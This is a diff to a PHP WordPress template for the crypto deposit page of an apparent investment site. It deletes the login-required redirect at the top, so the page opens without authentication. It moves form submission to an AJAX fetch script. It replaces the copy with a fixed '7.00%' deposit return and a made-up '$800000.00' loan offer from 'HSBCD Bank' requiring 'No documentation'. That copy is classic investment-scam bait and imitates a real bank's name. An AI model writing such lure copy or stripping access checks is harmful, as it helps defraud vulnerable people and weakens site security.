@@ -1,13 +1,10 @@
 <?php
 
-if ( ! is_user_logged_in() ) {
-    wp_redirect( home_url('/wsi/login/') );
-    exit();
-}
-
-
 if (!defined('ABSPATH')) exit;
-$wsi = plugins_url('assets/', __FILE__);
+
+// Get the plugin assets URL
+$PLUGIN_ASSETS = plugins_url('assets/', dirname(dirname(__FILE__)) . '/stock-vest.php');
+$wsi = $PLUGIN_ASSETS;
 
 $opts = function_exists('wsi_get_opts') ? wsi_get_opts() : [];
 
@@ -118,8 +115,8 @@ $default_naira = number_format($min_invest * max(1, $exchange_rate), 2, '.', '')
 
                                                 <div class="card adminuiux-card">
                                                     <div class="card-header">
-                                                        <h5>Create Deposit</h5>
-                                                        <p class="text-secondary">Start growing your wealth through advanced DeFi-agriculture and smart investment solutions.</p>
+                                                        <h5>Create Deposit @ 7.00%</h5>
+                                                        <p class="text-secondary">Start your money growing with smart investment</p>
                                                     </div>
 
                                                     <div class="card-body">
@@ -129,12 +126,10 @@ $default_naira = number_format($min_invest * max(1, $exchange_rate), 2, '.', '')
                                                             <p><strong>Auto-confirm deposit enabled.</strong></p>
                                                         <?php endif; ?>
 
-                                                        <form id="wsi-deposit-form" method="post" action="<?php echo esc_url( admin_url('admin-post.php') ); ?>">
+                                                        <form id="wsi-deposit-form" method="post" action="<?php echo esc_url( admin_url('admin-ajax.php') ); ?>">
                                                             
-                                                            <input type="hidden" name="redirect_to" value="<?php echo esc_attr( (isset($_SERVER["REQUEST_URI"]) ? esc_url_raw($_SERVER["REQUEST_URI"]) : home_url("/") ) ); ?>">
                                                             <input type="hidden" name="action" value="wsi_submit_deposit">
                                                             <?php wp_nonce_field('wsi_deposit_nonce'); ?>
-                                                            <input type="hidden" name="is_ajax" value="1" id="is_ajax_field">
                                                             <input type="hidden" name="amount" id="amount_usd" value="">
 
 
@@ -250,9 +245,9 @@ $default_naira = number_format($min_invest * max(1, $exchange_rate), 2, '.', '')
                                                         <div class="avatar avatar-60 rounded bg-white-opacity text-white mb-4">
                                                             <i class="bi bi-tags h4"></i>
                                                         </div>
-                                                        <h2>CRYPTO DEPOSIT</h2>
-                                                        <h4 class="fw-medium">Seamlessly fund your <b>COFCO Capital</b> account by selecting from our range of supported <b>cryptocurrencies</b> </h4>
-                                                        <p class="mb-4">for a secure and efficient deposit experience</p>
+                                                        <h2>Great Offer!</h2>
+                                                        <h4 class="fw-medium">You have <b>LOAN</b> of <b>$ 800000.00</b> offer from HSBCD Bank</h4>
+                                                        <p class="mb-4">No documentation required...</p>
                                                         <button class="btn btn-light my-1">Apply Now</button>
                                                     </div>
                                                 </div>
@@ -732,6 +727,52 @@ $default_naira = number_format($min_invest * max(1, $exchange_rate), 2, '.', '')
 
             </script-->
 
+            <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    const form = document.getElementById('wsi-deposit-form');
+                    if (!form) return;
+                    
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        
+                        const formData = new FormData(form);
+                        
+                        fetch('<?php echo esc_url(admin_url('admin-ajax.php')); ?>', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            console.log('Response status:', response.status);
+                            return response.text().then(text => {
+                                console.log('Response text:', text);
+                                try {
+                                    return JSON.parse(text);
+                                } catch (e) {
+                                    console.error('JSON parse error:', e);
+                                    throw new Error('Invalid response format: ' + text.substring(0, 100));
+                                }
+                            });
+                        })
+                        .then(data => {
+                            console.log('Parsed data:', data);
+                            if (data.success) {
+                                alert('Deposit submitted successfully!');
+                                if (data.data && data.data.redirect) {
+                                    window.location.href = data.data.redirect;
+                                } else {
+                                    window.location.href = '<?php echo esc_url(site_url('/wsi/deposit/')); ?>';
+                                }
+                            } else {
+                                alert('Error: ' + (data.data && data.data.message ? data.data.message : 'Failed to submit deposit'));
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Fetch error:', error);
+                            alert('Error submitting form: ' + error.message);
+                        });
+                    });
+                });
+            </script>
 
         </body>
 
